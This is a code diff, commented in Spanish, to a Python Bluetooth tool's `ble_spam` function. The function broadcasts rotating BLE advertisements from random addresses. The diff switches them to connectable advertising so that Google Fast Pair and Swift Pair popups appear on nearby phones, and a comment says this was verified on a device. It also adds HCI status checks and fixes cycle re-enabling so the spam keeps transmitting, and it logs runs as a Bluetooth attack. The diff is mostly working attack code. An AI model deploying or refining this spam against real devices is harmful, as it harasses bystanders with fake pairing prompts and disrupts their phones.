@@ -1194,6 +1194,75 @@ def _hci(iface, ocf, data_bytes, timeout=3):
     return _run(cmd, timeout=timeout)
 
 
+# Nombres de los status HCI que mas nos interesan al anunciar.
+_HCI_STATUS_NAMES = {
+    0x00: "success",
+    0x01: "unknown command",
+    0x0C: "command disallowed",
+    0x11: "unsupported feature/parameter",
+    0x12: "invalid HCI parameters",
+    0x1A: "unsupported remote feature",
+}
+
+
+def _hci_status(text):
+    """Extrae el byte de status del evento que `hcitool cmd` imprime en stdout.
+
+    CLAVE: `hcitool cmd` sale con exit code 0 si logro ENVIAR el comando y
+    recibir CUALQUIER evento de respuesta, AUNQUE el controller lo rechace
+    (p.ej. 0x0C Command Disallowed cuando bluetoothd ya controla el
+    advertising). Por eso `returncode` NO alcanza para saber si el comando
+    surtio efecto: hay que leer el status del evento Command Complete (0x0e)
+    o Command Status (0x0f). Esta era la causa de 'dice OK pero no anuncia'.
+
+    Formato tipico:
+        > HCI Event: 0x0e plen 4
+          01 0A 20 00
+    En Command Complete (0x0e) los datos son: num_cmds(1) opcode(2) status(1)
+    -> status = 4to byte. En Command Status (0x0f): status(1) num_cmds(1)
+    opcode(2) -> status = 1er byte. Devuelve int, o None si no se puede leer
+    (stdout vacio en tests, u otro formato de hcitool)."""
+    if not text:
+        return None
+    lines = [ln.strip() for ln in text.splitlines()]
+    for i, line in enumerate(lines):
+        low = line.lower()
+        if 'hci event' not in low:
+            continue
+        is_cc = '0x0e' in low
+        is_cs = '0x0f' in low
+        if not (is_cc or is_cs):
+            continue
+        for j in range(i + 1, min(i + 4, len(lines))):
+            hexb = re.findall(r'\b[0-9A-Fa-f]{2}\b', lines[j])
+            if is_cc and len(hexb) >= 4:
+                try: return int(hexb[3], 16)
+                except Exception: return None
+            if is_cs and len(hexb) >= 1:
+                try: return int(hexb[0], 16)
+                except Exception: return None
+    return None
+
+
+def _hci_ok(r):
+    """(ok, status) de un resultado de `_hci`. ok=True solo si el comando se
+    envio (returncode 0) Y el controller lo acepto (status 0x00). Si no hay
+    status legible (stdout vacio), confiamos en el returncode."""
+    if r is None or getattr(r, 'returncode', 1) != 0:
+        return False, None
+    st = _hci_status(getattr(r, 'stdout', '') or '')
+    if st is None:
+        return True, None
+    return (st == 0x00), st
+
+
+def _hci_describe(st):
+    """' (HCI status 0xNN nombre)' para los mensajes de error, o '' si None."""
+    if st is None:
+        return ""
+    return f" (HCI status 0x{st:02X} {_HCI_STATUS_NAMES.get(st, 'error')})"
+
+
 def _load_payloads(kind):
     """Lee data/ble_payloads/<kind>.txt. Cada linea:
        name=<str>|cid=<4-hex>|data=<hex-pairs>
@@ -1396,8 +1465,13 @@ def ble_spam(iface=DEFAULT_IFACE, seconds=20, mode="names", period_s=1.0):
     if r is None or r.returncode != 0:
         return None, "hcitool: no se pudo hablar con el controller (sudoers?)"
     time.sleep(0.1)
-    # LE Set Advertising Parameters: interval 100ms, non-connectable, 3 ch.
-    r = _hci(iface, 0x0006, [0xA0, 0x00, 0xA0, 0x00, 0x03, 0x00, 0x00,
+    # LE Set Advertising Parameters: interval 100ms, CONNECTABLE (ADV_IND), 3 ch.
+    # Conectable (adv_type=0x00) es clave: Google Fast Pair y MS Swift Pair SOLO
+    # disparan el popup con advertising conectable, y los nombres aparecen en la
+    # lista de Bluetooth del telefono. Verificado on-device (2026-10-29): la
+    # trama irradia y otro radio la recibe; antes era 0x03 (no-conectable) -> no
+    # salia popup aunque el advert si estaba al aire.
+    r = _hci(iface, 0x0006, [0xA0, 0x00, 0xA0, 0x00, 0x00, 0x00, 0x00,
                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00])
     if r is None or r.returncode != 0:
         _hci(iface, 0x000A, [0x00])
@@ -1439,6 +1513,7 @@ def ble_spam(iface=DEFAULT_IFACE, seconds=20, mode="names", period_s=1.0):
 
     cycles = 0
     failed_commands = 0
+    last_bad_status = None   # ultimo status HCI != 0x00 (el que explica el fallo)
     uniq_names = set()
     last_name = ""
     t_end = time.time() + seconds
@@ -1449,30 +1524,40 @@ def ble_spam(iface=DEFAULT_IFACE, seconds=20, mode="names", period_s=1.0):
             # pública, Android/iOS filtran y no sale popup).
             payload = builder()
             n = f"{mode}-{cycles}"
-            r_disable = _hci(iface, 0x000A, [0x00])
-            r_addr = _hci(iface, 0x0005, _random_static_address())
-            r_params = _hci(iface, 0x0006, [
-                0xA0, 0x00, 0xA0, 0x00, 0x03, 0x01,
+            ok_dis, _      = _hci_ok(_hci(iface, 0x000A, [0x00]))
+            ok_addr, _     = _hci_ok(_hci(iface, 0x0005, _random_static_address()))
+            ok_par, st_par = _hci_ok(_hci(iface, 0x0006, [
+                0xA0, 0x00, 0xA0, 0x00, 0x00, 0x01,   # adv_type=0x00 CONNECTABLE
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00,
-            ])
-            if (r_disable is None or r_disable.returncode != 0 or
-                    r_addr is None or r_addr.returncode != 0 or
-                    r_params is None or r_params.returncode != 0):
+            ]))
+            if not (ok_dis and ok_addr and ok_par):
                 failed_commands += 1
+                if st_par not in (None, 0x00):
+                    last_bad_status = st_par
                 time.sleep(period)
                 continue
         else:
             item = random.choice(pool)
             payload = _build_adv_payload(item)
             n = item.get("name", "")
+            # Desactivar antes de re-habilitar: un `LE Set Advertise Enable` sobre
+            # un advertising YA activo devuelve 0x0C (command disallowed). El path
+            # OS ya desactiva al inicio del ciclo; el generico no lo hacia, asi
+            # que solo el 1er ciclo "enganchaba" y el resto se contaba como fallo.
+            _hci(iface, 0x000A, [0x00])
         if not payload:
             continue
         padded = payload + bytes(31 - len(payload))
-        r_data = _hci(iface, 0x0008, [len(payload)] + list(padded))
-        r_enable = _hci(iface, 0x000A, [0x01])
-        if (r_data is None or r_data.returncode != 0 or
-                r_enable is None or r_enable.returncode != 0):
+        ok_data, st_data = _hci_ok(_hci(iface, 0x0008, [len(payload)] + list(padded)))
+        ok_en,   st_en   = _hci_ok(_hci(iface, 0x000A, [0x01]))
+        if not (ok_data and ok_en):
             failed_commands += 1
+            # El enable (0x000A) es el que pone el advert al aire: su status es
+            # el mas informativo (p.ej. 0x0C = bluetoothd tiene el advertising).
+            for st in (st_en, st_data):
+                if st not in (None, 0x00):
+                    last_bad_status = st
+                    break
             time.sleep(period)
             continue
         cycles += 1
@@ -1483,16 +1568,30 @@ def ble_spam(iface=DEFAULT_IFACE, seconds=20, mode="names", period_s=1.0):
     # Teardown
     _hci(iface, 0x000A, [0x00])
 
+    status_name = (_HCI_STATUS_NAMES.get(last_bad_status)
+                   if last_bad_status is not None else None)
     log_bt_attack("ble_spam", "", "ok" if cycles > 0 else "fail",
                   details=f"iface={iface} mode={mode} seconds={seconds} "
                           f"cycles={cycles} uniq={len(uniq_names)} "
-                          f"last={last_name} failed_commands={failed_commands}")
-    err = (f"hcitool: {failed_commands} orden(es) HCI rechazadas; "
-           "comprueba sudoers/rfkill/controller"
-           if failed_commands else None)
+                          f"last={last_name} failed_commands={failed_commands} "
+                          f"hci_status={_hci_describe(last_bad_status).strip()}")
+    err = None
+    if failed_commands:
+        if last_bad_status == 0x0C:
+            hint = (" — el controller rechaza el advertising (command "
+                    "disallowed): bluetoothd probablemente lo tiene tomado. "
+                    "Para 'sudo systemctl stop bluetooth' o usa el onboard hci0.")
+        elif last_bad_status in (0x11, 0x12):
+            hint = (" — el controller no soporta estos parametros de "
+                    "advertising (prueba el onboard hci0).")
+        else:
+            hint = " — comprueba sudoers/rfkill/controller"
+        err = (f"hcitool: {failed_commands} orden(es) HCI rechazadas"
+               f"{_hci_describe(last_bad_status)}{hint}")
     return {"iface": iface, "mode": mode, "seconds": seconds,
             "cycles": cycles, "uniq_names": len(uniq_names),
             "last_name": last_name, "failed_commands": failed_commands,
+            "hci_status": last_bad_status, "hci_status_name": status_name,
             "raw": ""}, err
 
 
@@ -1703,7 +1802,10 @@ def main():
             if err and not data:
                 _emit({"ok": False, "error": err})
                 sys.exit(1)
-            _emit({"ok": True, **(data or {})})
+            # `data` existe aun cuando el controller rechaza todo (cycles=0), por
+            # eso el err va como "warn": asi el diagnostico HCI llega a la UI en
+            # vez de perderse (si no, solo se veria "ciclos=0" sin causa).
+            _emit({"ok": True, "warn": err, **(data or {})})
         elif cmd == 'capture':
             # bt_ops.py capture [iface] [seconds]
             args = sys.argv[2:]
